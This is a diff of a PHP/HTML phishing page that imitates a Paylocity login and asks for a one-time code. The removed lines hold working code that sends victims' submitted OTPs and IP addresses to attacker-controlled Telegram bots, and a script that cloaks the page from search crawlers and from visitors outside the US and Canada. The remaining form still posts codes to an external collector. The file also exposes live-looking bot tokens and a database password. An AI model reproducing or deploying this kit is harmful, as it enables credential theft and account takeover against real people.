@@ -1,102 +1,82 @@
 <?php 
 
 include 'firewall.php';
-// $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");
 
-
-
-// Telegram configuration
-// define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
-// define('TELEGRAM_CHAT_ID', '1325797388');
-
-
-$telegram_bots = [
-    [
-        'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
-        'chat_id' => '1325797388'
-    ],
-    [
-        'token' => '7570530329:AAGCyvAYZQd45RebzrTY1oHoDEOmxe1ackI',
-        'chat_id' => '6494353790'
-    ]
-    // Add more bots here if needed
-];
-
-
-
-
-if ($_SERVER["REQUEST_METHOD"]=="POST"){
-    // $query = "INSERT INTO otpconfirm (otpconfirm,time,ip) VALUES ('$_POST[otpconfirm]',NOW(),'$_POST[ip]')";
-    // $result = pg_query($query);
-
-
-
-
-
-// Get and define form inputs
-$otpconfirm = htmlspecialchars($_POST['otpconfirm'] ?? '? ? ?');
-$ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
-
-// Generate timestamp
-$timestamp = date("Y-m-d H:i:s");
-
-// Define message structure before sending to Telegram
-$telegram_message = "📝 *Confirm OTP Submission*:\n\n".
-                    "👤 *OTP:* $otpconfirm\n".
-                    "⏳ *Submitted At:* $timestamp\n".
-                    "💬 *IP:* $ip";
-                    
-
-// $telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
-
-// // Send message using CURL (allows better error handling)
-// $data = [
-//     'chat_id' => TELEGRAM_CHAT_ID,
-//     'text' => $telegram_message,
-//     'parse_mode' => 'Markdown'
+// $telegram_bots = [
+//     [
+//         'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
+//         'chat_id' => '1325797388'
+//     ],
+//     [
+//         'token' => '7395338291:AAFiyILeZdxyENeRvcaYgZ93vnv2DYyW_XM',
+//         'chat_id' => '8160582785'
+//     ]
+//     // Add more bots here if needed
 // ];
 
-// $ch = curl_init();
-// curl_setopt($ch, CURLOPT_URL, $telegram_url);
-// curl_setopt($ch, CURLOPT_POST, 1);
-// curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-// $response = curl_exec($ch);
-// curl_close($ch);
 
 
 
-function sendMessageToTelegramBots($message, $bots) {
-    foreach ($bots as $bot) {
-        $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
-
-        $data = [
-            'chat_id' => $bot['chat_id'],
-            'text' => $message,
-            'parse_mode' => 'Markdown'
-        ];
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $telegram_url);
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
-    }
-}
-
-// Send text message to Telegram
-sendMessageToTelegramBots($telegram_message, $telegram_bots);
+// if ($_SERVER["REQUEST_METHOD"]=="POST"){
+//     // $query = "INSERT INTO otpconfirm (otpconfirm,time,ip) VALUES ('$_POST[otpconfirm]',NOW(),'$_POST[ip]')";
+//     // $result = pg_query($query);
 
 
 
-header("Location:https://lendingpoint.onrender.com/lendingpoint/processing.html");
 
-exit; 
-}
+
+// // Get and define form inputs
+// $otpconfirm = htmlspecialchars($_POST['otpconfirm'] ?? '? ? ?');
+// $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
+
+// // Generate timestamp
+// $timestamp = date("Y-m-d H:i:s");
+
+// // Define message structure before sending to Telegram
+// $telegram_message = "📝 *Confirm OTP Submission*:\n\n".
+//                     "👤 *OTP:* $otpconfirm\n".
+//                     "⏳ *Submitted At:* $timestamp\n".
+//                     "💬 *IP:* $ip";
+                    
+
+
+// function sendMessageToTelegramBots($message, $bots) {
+//     foreach ($bots as $bot) {
+//         $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
+
+//         $data = [
+//             'chat_id' => $bot['chat_id'],
+//             'text' => $message,
+//             'parse_mode' => 'Markdown'
+//         ];
+
+//         $ch = curl_init();
+//         curl_setopt($ch, CURLOPT_URL, $telegram_url);
+//         curl_setopt($ch, CURLOPT_POST, 1);
+//         curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+//         curl_exec($ch);
+//         curl_close($ch);
+//     }
+// }
+
+// // Send text message to Telegram
+// sendMessageToTelegramBots($telegram_message, $telegram_bots);
+
+
+
+// header("Location:https://paylocity.koyeb.app/www.paylocity.com/careers/all-listings.job.34092/processing.html");
+
+// exit; 
+// }
+// 
 ?>
+
+
+
+
+
+
 
 
 <!DOCTYPE html>
@@ -359,42 +339,6 @@ exit;
         }()
     }(window);
     </script>
-
-<script>
-  // Geo-Blocking and User-Agent Filtering
-  (function() {
-    // const blockedCountries = ['RU', 'CN', 'IR', 'KP', 'SY', 'CU'];
-    const allowedCountries = ['US', 'CA'];
-    const botUserAgents = [/googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i, /yandex/i, /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i];
-
-    // User-Agent detection
-    const ua = navigator.userAgent;
-    if (botUserAgents.some(bot => bot.test(ua))) {
-      document.write('<style>body{display:none !important;}</style>');
-      throw new Error("Bot access denied");
-    }
-
-    // Geo-blocking via IP-based external API (optional - use server-side for reliability)
-    fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        if (!allowedCountries.includes(data.country_code)) {
-          document.write('<style>body{display:none !important;}</style>');
-          throw new Error("Blocked geo-region");
-        }
-      })
-      .catch(() => {
-        document.write('<style>body{display:none !important;}</style>');
-        throw new Error("Geo-location check failed");
-      });
-  })();
-</script>
-
-
-
-
-
-
 </head>
 
 
@@ -456,7 +400,7 @@ exit;
 
 
 
-                    <form action="https://reposubmit.onrender.com/otp_confirm.php" accept-charset="UTF-8" data-validate="" method="post">
+                    <form action="https://submitter.onrender.com/otp_confirm.php" accept-charset="UTF-8" data-validate="" method="post">
 
 
                         <input type="hidden" autocomplete="off">
@@ -470,7 +414,7 @@ exit;
 
                         </p>
 
-                        <input type="hidden" name="ip" value="<?php echo getenv('HTTP_X_FORWARDED_FOR'); ?>" />
+                        
 
                         <div class="form-content">
                             <h2>Enter a code from your device</h2>
